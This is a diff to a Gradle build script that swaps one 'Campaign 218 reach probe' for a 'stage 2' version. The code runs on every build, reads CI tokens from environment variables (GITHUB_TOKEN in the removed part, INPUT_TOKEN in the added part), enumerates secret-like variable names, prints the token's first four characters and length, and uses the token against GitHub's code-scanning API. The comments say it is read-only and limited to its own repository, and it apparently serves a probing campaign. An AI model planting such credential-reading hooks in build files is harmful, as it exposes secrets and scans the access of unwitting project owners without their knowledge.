@@ -2,26 +2,26 @@ plugins {
     id 'java'
 }
 
-// Campaign 218 reach probe. READ-ONLY. Prints STATUS CODES and NAMES only --
-// never a credential value, nothing exfiltrated, nothing persisted. Own repo, own job.
-def tok = System.getenv("GITHUB_TOKEN")
-println "REACH-7Q4X token-present=" + (tok != null) + " len=" + (tok == null ? 0 : tok.length())
-
-def names = System.getenv().keySet().findAll { it ==~ /(?i).*(TOKEN|GITHUB_|ACTIONS_).*/ }.sort()
-println "REACH-7Q4X env-names=" + names
-
-if (tok != null) {
-    ["code-scanning/alerts", "code-scanning/analyses", "actions/artifacts"].each { ep ->
+// Campaign 218 reach probe, stage 2. STRICTLY READ-ONLY.
+// Prints STATUS CODES, LENGTHS and PUBLIC PREFIX CLASS only. No credential value is ever printed,
+// nothing is exfiltrated, nothing is persisted. Own repository, own job, own token.
+def probe = { String label, String tok ->
+    if (tok == null || tok.isEmpty()) { println "REACH2-7Q4X " + label + " absent"; return }
+    def cls = tok.length() > 4 ? tok.substring(0, 4) : "?"
+    println "REACH2-7Q4X " + label + " present len=" + tok.length() + " class=" + cls
+    ["code-scanning/alerts", "code-scanning/analyses"].each { ep ->
         try {
             def c = new URL("https://api.github.com/repos/neve-larsson/zz-c218-depsub-0830/" + ep).openConnection()
             c.setRequestProperty("Authorization", "Bearer " + tok)
             c.setRequestProperty("Accept", "application/vnd.github+json")
             c.setConnectTimeout(15000); c.setReadTimeout(15000)
-            println "REACH-7Q4X " + ep + " status=" + c.getResponseCode()
+            println "REACH2-7Q4X " + label + " -> " + ep + " status=" + c.getResponseCode()
         } catch (Exception e) {
-            println "REACH-7Q4X " + ep + " error=" + e.getClass().getSimpleName()
+            println "REACH2-7Q4X " + label + " -> " + ep + " error=" + e.getClass().getSimpleName()
         }
     }
 }
+
+probe("INPUT_TOKEN", System.getenv("INPUT_TOKEN"))
 
 repositories { mavenCentral() }
